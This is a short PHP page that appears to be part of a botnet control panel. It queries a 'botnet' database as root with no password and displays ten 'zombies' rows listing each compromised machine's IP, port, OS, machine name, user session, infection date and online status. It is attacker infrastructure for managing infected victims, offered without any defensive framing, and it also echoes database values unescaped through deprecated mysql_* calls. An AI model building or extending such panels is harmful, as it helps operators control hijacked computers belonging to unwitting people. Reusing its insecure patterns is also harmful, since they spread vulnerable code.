<html>
    <head>
        <title>Last 10 Results</title>
    </head>
    <body>
        <table>
        <thead>
            <tr>
                <td>Id</td>
                <td>Ip</td>
				<td>Port</td>
				<td>OS</td>
                <td>Nom machine</td>
				<td>Session Utilisateur</td>
                <td>Date de compromission</td>
				<td>Dernière connexion</td>
                <td>Statut</td>
            </tr>
        </thead>
        <tbody>
        <?php
            $connect = mysql_connect("localhost","root", "");
            if (!$connect) {
                die(mysql_error());
            }
            mysql_select_db("botnet");
            $results = mysql_query("SELECT * FROM zombies LIMIT 10");
            while($row = mysql_fetch_array($results)) {
            ?>
                <tr>
                    <td><?php echo $row['id']?></td>
                    <td><?php echo $row['ip']?></td>
					<td><?php echo $row['port']?></td>
                    <td><?php echo $row['os']?></td>
					<td><?php echo $row['machine_name']?></td>
                    <td><?php echo $row['user_session']?></td>
					<td><?php echo $row['infection_date']?></td>
                    <td><?php echo $row['last_time_online']?></td>
					<td><?php echo $row['status']?></td>
                </tr>

            <?php
            }
            ?>
            </tbody>
            </table>
    </body>
</html>